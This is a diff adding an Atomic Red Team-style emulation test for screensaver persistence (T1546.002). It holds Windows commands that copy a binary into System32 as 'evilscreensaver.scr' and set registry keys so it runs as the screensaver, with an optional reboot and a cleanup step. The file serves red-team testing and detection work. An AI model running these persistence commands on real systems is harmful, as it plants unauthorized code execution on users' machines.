@@ -1,0 +1,58 @@
+{
+  "id": "281201e7-de41-4dc9-b73d-f288938cbb64",
+  "name": "Set Arbitrary Binary as Screensaver",
+  "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "fa144992-891d-40d3-bd7a-8da3dcd9b97e",
+      "type": "execute-command",
+      "data": {
+        "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2e324855-2618-41b3-bd9e-cf3abe68c1e1",
+      "type": "execute-command",
+      "data": {
+        "command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "fa144992-891d-40d3-bd7a-8da3dcd9b97e",
+      "p": "on-success",
+      "o": "2e324855-2618-41b3-bd9e-cf3abe68c1e1"
+    },
+    {
+      "s": "fa144992-891d-40d3-bd7a-8da3dcd9b97e",
+      "p": "on-failure",
+      "o": "2e324855-2618-41b3-bd9e-cf3abe68c1e1"
+    }
+  ],
+  "tags": [
+    "T1546.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "input_binary",
+      "type": "path",
+      "description": "Executable binary to use in place of screensaver for persistence",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+      "name": "reboot",
+      "type": "integer",
+      "description": "Set to non-zero value if you want the test to reboot the system so that changes take effect",
+      "value": "0"
+    }
+  ]
+}
